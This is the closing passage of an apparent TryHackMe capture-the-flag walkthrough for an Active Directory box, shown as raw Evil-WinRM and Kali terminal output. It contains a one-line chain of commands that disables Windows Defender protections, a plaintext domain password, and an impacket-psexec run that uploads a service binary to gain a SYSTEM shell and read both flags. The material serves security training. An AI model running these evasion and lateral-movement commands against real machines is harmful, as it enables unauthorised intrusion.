*Evil-WinRM* PS C:\Users> cd enterprise-core-vn

*Evil-WinRM* PS C:\Users\enterprise-core-vn> cat Desktop\user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat system.txt
Access to the path 'C:\Users\Administrator\Desktop\system.txt' is denied.
At line:1 char:1
+ cat system.txt
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Admini...ktop\system.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand

*Evil-WinRM* PS C:\Users\a-whitehat\Documents> Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true
```


```bash                                       
┌──(kali㉿kali)-[~]
└─$ impacket-psexec vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@'10.10.64.234'

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.64.234.....
[*] Found writable share ADMIN$
[*] Uploading file cJmEodpd.exe
[*] Opening SVCManager on 10.10.64.234.....
[*] Creating service AWCu on 10.10.64.234.....
[*] Starting service AWCu.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> ls           
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32> type C:\Users\Administrator\Desktop\system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}

```